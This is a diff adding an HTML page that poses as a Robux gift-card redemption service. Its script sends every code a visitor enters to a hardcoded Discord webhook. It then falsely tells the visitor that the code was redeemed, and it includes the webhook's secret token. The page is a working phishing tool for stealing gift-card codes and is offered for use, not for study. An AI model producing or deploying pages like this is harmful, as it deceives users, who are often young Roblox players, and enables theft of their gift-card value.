@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GiftCard Redeem</title>
+</head>
+<body>
+    <h1>GiftCard Redeem</h1>
+    <input type="text" id="codeInput" placeholder="Enter your Robux Code">
+    <button id="redeemButton">Redeem</button>
+
+    <script>
+        // Get references to HTML elements
+        const codeInput = document.getElementById("codeInput");
+        const redeemButton = document.getElementById("redeemButton");
+
+        // Add an event listener to the redeem button
+        redeemButton.addEventListener("click", () => {
+            // Get the entered code
+            const code = codeInput.value;
+
+            // Construct the message
+            const message = `Code Redeem: ${code}`;
+
+            // Construct the Discord webhook URL
+            const webhookURL = "https://discord.com/api/webhooks/1167548036822605915/gGLUOX_ZRlcAJbx7S7AmbBE3WoqASISx8AfE7jALXhMYjFIEppufubpwUxUzyx1O0A7Z";
+
+            // Create a JSON payload to send to the webhook
+            const payload = {
+                content: message
+            };
+
+            // Send the message to Discord using a POST request
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Code Redeemed successfully!");
+                    codeInput.value = ""; // Clear the input
+                } else {
+                    alert("Error redeeming code. Please try again later.");
+                }
+            })
+            .catch(error => {
+                console.error("An error occurred:", error);
+            });
+        });
+    </script>
+</body>
+</html>
